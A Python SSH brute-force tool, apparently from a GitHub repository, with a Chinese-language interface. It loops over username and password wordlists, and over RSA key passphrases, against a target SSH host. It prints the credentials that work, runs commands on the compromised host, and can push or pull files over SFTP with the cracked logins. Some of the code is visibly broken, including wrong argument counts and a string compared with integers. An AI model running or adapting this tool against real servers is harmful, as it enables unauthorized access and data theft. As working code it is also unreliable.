# -*- coding: utf-8

import paramiko
import sys
import smtplib
import socket
import argparse
import os
import configparser
import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.header import Header
from typing import Callable

# print logo and some information
print("""
@Author: W01f
@repo: https://github.com/W01fh4cker/W01f-ssh-crack/
@version: 1.0
@time: 2022/4/13
     ███████╗███████╗██╗  ██╗       ██████╗██████╗  █████╗  ██████╗██╗  ██╗
     ██╔════╝██╔════╝██║  ██║      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
     ███████╗███████╗███████║█████╗██║     ██████╔╝███████║██║     █████╔╝ 
     ╚════██║╚════██║██╔══██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
     ███████║███████║██║  ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
     ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                                                                                                               
""")

# re coding and fixing bugs by: [KOKOMI12345]Fuxuan(https://github.com/KOKOMI12345)


def parseArgs() -> tuple[str, str , str, int]:
    parser = argparse.ArgumentParser(description='SSH Brute-Force Cracking Tool')
    parser.add_argument('--mode', type=str, default='client', help="模式选择，可选client、rsa、trans")
    parser.add_argument('--stmpPath', type=str, default='data.conf', help="配置文件路径")
    parser.add_argument('--hostname', type=str, default='127.0.0.1', help="目标主机IP地址")
    parser.add_argument('--port', type=int, default=22, help="目标主机SSH端口")
    args = parser.parse_args()
    return args.mode , args.stmpPath, args.hostname, args.port

def getConfig(section: str, key: str, stmpPathConf: str) -> str:
    config = configparser.ConfigParser()
    config.read(stmpPathConf)
    return config.get(section, key)

def sshClientConnection(hostname:str, SSHport: int):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.WarningPolicy())
    with open("username.txt", 'r', encoding='utf-8') as f:
        user_name = f.readlines()
    with open("password.txt", 'r', encoding='utf-8') as f:
        pass_word = f.readlines()
    for username in user_name:
        for password in pass_word:
            try:
                ssh_client.connect(hostname, port=SSHport, username=str(username), password=str(password))
                stdin, stdout, stderr = ssh_client.exec_command('whoami',timeout=10)
                print(stdout.read().decode('utf-8'))
                print(fr"[√]SSH连接成功! 账号: {username} 密码为：{password}")
                break
            except paramiko.SSHException:
                print(fr"[!]尝试账号: {username} 密码：{password} 失败! 自动跳过...")
                continue
            except Exception:
                pass
            finally:
                ssh_client.close()

def sshRsaConnection(hostname: str, SSHport: int):
    id_rsa_filePath = input("请输入您的id_rsa文件的绝对路径：") 
    flag1 = input("您是否需要指定密码？如需要，请输入y；否则输入n。")
    if(flag1 == 'y'):
        with open("username.txt", 'r', encoding='utf-8') as f:
            user_name = f.readlines()
        with open("password.txt", 'r', encoding='utf-8') as f:
            pass_word = f.readlines()
        for Rsa_password in pass_word:
            for username in user_name:
                try:
                    local_key = paramiko.RSAKey.from_private_key_file(id_rsa_filePath if id_rsa_filePath is not None else '/home/super/.ssh/id_rsa', password=str(Rsa_password))
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
                    ssh.connect(hostname,
                                port=SSHport,
                                username=username,
                                pkey=local_key)
                    stdin, stdout, stderr = ssh.exec_command('hostname',timeout=10)
                    print(stdout.read().decode())
                    print(fr"[√]SSH连接成功! 账号: {username} 密码为：{Rsa_password}")
                    break
                except paramiko.SSHException:
                    print(fr"[!]尝试账号: {username} 密码：{Rsa_password} 失败! 自动跳过...")
                    continue
                except Exception:
                    pass
                finally:
                    ssh.close()
    elif(flag1 == 'n'):
        with open("username.txt", 'r', encoding='utf-8') as f:
            user_name = f.readlines()
        for username in user_name:
            try:
                local_key = paramiko.RSAKey.from_private_key_file('/home/super/.ssh/id_rsa')
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
                ssh.connect(hostname,
                            port=22,
                            username=username,
                            pkey=local_key)
                stdin, stdout, stderr = ssh.exec_command('hostname',timeout=10)
                print(stdout.read().decode())
                ssh.close()
            except paramiko.SSHException:
                print(fr"[!]尝试账号: {username} 失败! 自动跳过...")
                continue
            finally:
                ssh.close()
        print(fr"[√]SSH连接成功!账号： {username}")
    else:
        print("您的输入有误！")

def transFile(hostname: str, SSHport: int):
    with open("username.txt", 'r', encoding='utf-8') as f:
        user_name = f.readlines()
    with open("password.txt", 'r', encoding='utf-8') as f:
        pass_word = f.readlines()
    flag2 = input("如果您要上传文件，请输入1；如果您要下载文件，请输入2。")
    if(flag2==1):
        global p,q
        for username in user_name:
            for password in pass_word:
                try:
                    parameter = (hostname, SSHport)
                    trans = paramiko.Transport(parameter)
                    trans.connect(username=username, password=password)
                    sftp = paramiko.SFTPClient.from_transport(trans)
                    local_path = input("请输入您要上传的本地文件的绝对路径：")
                    remote_path = input("请输入您要上传的位置的绝对路径：")
                    try:
                        sftp.put(localpath=local_path, remotepath=remote_path)
                        print("[√]上传成功！")
                        print(fr"[√]连接成功！账号: {username} 密码为：{password}")
                        break
                    except Exception:
                        print("[×]上传失败。")
                        continue
                    finally:
                        trans.close()
                except Exception:
                    pass
    elif(flag2==2):
        for username in user_name:
            for password in pass_word:
                try:
                    parameter = (hostname, SSHport)
                    trans = paramiko.Transport(parameter)
                    trans.connect(username=username, password=password)
                    sftp = paramiko.SFTPClient.from_transport(trans)
                    local_path = input("请输入您要保存的位置的绝对路径：")
                    remote_path = input("请输入您要获取的文件的绝对路径：")
                    try:
                        sftp.get(localpath=local_path, remotepath=remote_path)
                        print("[√]下载成功！")
                    except Exception:
                        print("[×]下载失败。")
                        continue
                    finally:
                        trans.close()
                except Exception:
                    pass
    else:
        print("您的输入有误！")

def send_msg():
    server = "smtp.qq.com"
    port = 465
    sender = getConfig("data", "sender")
    pw = getConfig("data", "pw")
    receivers = getConfig("data", "receivers")
    machine_name = socket.gethostname()
    msg_root = MIMEMultipart('mixed')
    msg_root['From'] = Header(f'{machine_name} <{sender}>')
    msg_root['Subject'] = Header(f'Message from {machine_name}', 'utf-8')
    mail_msg = f"""
	<html>
	  <body>
	  <p>[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]<br>
		 Message from {machine_name}</p>
	<p>Path: {os.getcwd()}<br>
	   Args: {' '.join(sys.argv)}</p>
       您的扫描任务已经完成，如果觉得本软件还不错的话请给个star，谢谢您！
       仓库地址：https://github.com/W01fh4cker/comprehensive-ssh-brute-crack
       有任何问题、建议，可以联系邮箱sharecat2022@gmail.com或者直接在github上面提出issues，地址为：https://github.com/W01fh4cker/comprehensive-ssh-brute-crack/issues。感谢您的每一个建议！祝您生活愉快！                               From W01fh4cker
	</body>
	</html>"""

    msg_root.attach(MIMEText(mail_msg, 'html', 'utf-8'))

    smtp = smtplib.SMTP_SSL(server, port)
    smtp.login(sender, pw)
    smtp.sendmail(sender, receivers, msg_root.as_string())
    print("[√]发送成功")
    smtp.quit()

if __name__ == '__main__':

    def print_successmsg():
        Success_Message = "连接成功！"
        print(Success_Message)

    def print_errormsg():
        IfError_Message = "请先自查您的输入、配置文件填写是否有问题！如果确认无误，请直接发邮件至sharecat2022@gmail.com或者提出issues！"
        print(IfError_Message)

    modeDict: dict[str, tuple[Callable]] = {
        'client': (sshClientConnection, send_msg),
        'rsa': (sshRsaConnection, send_msg, print_successmsg),
        'trans': (transFile, send_msg),
        'default': (print)
    }
      # 其实这里我本来想用 match case 语法，但是match case语法在python3.10之后才支持，所以我就用字典来代替了, 提升向后兼容性

    mode, stmpPath, hostname, SSHport = parseArgs()

    if mode not in modeDict:
        modeDict['default'](f"模式{mode}不存在！")
    else:
        try:
            if mode == "default":
                print("请指定模式！")
                exit(1)
            modeDict[mode][0](hostname, SSHport)
            if len(modeDict[mode]) > 1:
                modeDict[mode][1]()
            if len(modeDict[mode]) > 2:
                modeDict[mode][2]()
        except Exception as e:
            print_errormsg()
            print(e)
        except KeyboardInterrupt:
            print("[!]用户中断！")
            exit(1)